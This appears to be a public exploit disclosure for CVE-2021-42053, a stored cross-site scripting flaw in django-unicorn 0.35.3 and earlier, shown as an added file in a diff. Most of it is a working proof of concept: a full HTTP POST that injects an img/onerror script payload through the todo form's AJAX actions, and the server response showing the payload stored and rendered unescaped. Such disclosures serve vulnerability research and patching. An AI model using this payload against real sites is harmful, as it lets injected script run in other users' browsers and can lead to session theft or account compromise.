@@ -1,0 +1,56 @@
+# Exploit Title: django-unicorn 0.35.3 - Stored Cross-Site Scripting (XSS)
+# Date: 10/7/21
+# Exploit Author: Raven Security Associates, Inc. (ravensecurity.net)
+# Software Link: https://pypi.org/project/django-unicorn/
+# Version: <= 0.35.3
+# CVE: CVE-2021-42053
+
+django-unicorn <= 0.35.3 suffers from a stored XSS vulnerability by improperly escaping data from AJAX requests.
+
+Step 1: Go to www.django-unicorn.com/unicorn/message/todo
+Step 2: Enter an xss payload in the todo form (https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).
+
+
+POC:
+
+POST /unicorn/message/todo HTTP/2
+Host: www.django-unicorn.com
+Cookie: csrftoken=EbjPLEv70y1yPrNMdeFg9pH8hNVBgkrepSzuMM9zi6yPviifZKqQ3uIPJ4hsFq3z
+Content-Length: 258
+Sec-Ch-Ua: "";Not A Brand"";v=""99"", ""Chromium"";v=""94""
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
+Content-Type: text/plain;charset=UTF-8
+Accept: application/json
+X-Requested-With: XMLHttpRequest
+X-Csrftoken: EbjPLEv70y1yPrNMdeFg9pH8hNVBgkrepSzuMM9zi6yPviifZKqQ3uIPJ4hsFq3z
+Sec-Ch-Ua-Platform: ""Linux""
+Origin: https://www.django-unicorn.com
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://www.django-unicorn.com/examples/todo
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+{""id"":""Q43GSmJh"",""data"":{""task"":"""",""tasks"":[]},""checksum"":""4ck2yTwX"",""actionQueue"":[{""type"":""syncInput"",""payload"":{""name"":""task"",""value"":""<img src=x onerror=alert(origin)>""}},{""type"":""callMethod"",""payload"":{""name"":""add""},""partial"":{}}],""epoch"":1633578678871}
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+HTTP/2 200 OK
+Date: Thu, 07 Oct 2021 03:51:18 GMT
+Content-Type: application/json
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+Referrer-Policy: same-origin
+Via: 1.1 vegur
+Cf-Cache-Status: DYNAMIC
+Expect-Ct: max-age=604800, report-uri=""https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct""
+Report-To: {""endpoints"":[{""url"":""https:\/\/a.nel.cloudflare.com\/report\/v3?s=b4nQavto8LK9ru7JfhbNimKP71ZlMtduJTy6peHCwxDVWBH2Mkn0f7O%2FpWFy1FgPTd6Z6FmfkYUw5Izn59zN6kTQmjNjddiPWhWCWZWwOFiJf45ESQxuxr44UeDv3w51h1Ri6ESnNE5Y""}],""group"":""cf-nel"",""max_age"":604800}
+Nel: {""success_fraction"":0,""report_to"":""cf-nel"",""max_age"":604800}
+Server: cloudflare
+Cf-Ray: 69a42b973f6a6396-ORD
+Alt-Svc: h3="":443""; ma=86400, h3-29="":443""; ma=86400, h3-28="":443""; ma=86400, h3-27="":443""; ma=86400
+
+{""id"": ""Q43GSmJh"", ""data"": {""tasks"": [""<img src=x onerror=alert(origin)>""]}, ""errors"": {}, ""checksum"": ""ZQn54Ct4"", ""dom"": ""<div unicorn:id=\""Q43GSmJh\"" unicorn:name=\""todo\"" unicorn:key=\""\"" unicorn:checksum=\""ZQn54Ct4\"">\n<form unicorn:submit.prevent=\""add\"">\n<input type=\""text\"" unicorn:model.lazy=\""task\"" placeholder=\""New task\"" id=\""task\""/>\n</form>\n<button unicorn:click=\""add\"">Add</button>\n<p>\n<ul>\n<li><img src=x onerror=alert(origin)></li>\n</ul>\n<button unicorn:click=\""$reset\"">Clear all tasks</button>\n</p>\n</div>\n"", ""return"": {""method"": ""add"", ""params"": [], ""value"": null}}"
+"ENDTEXT"
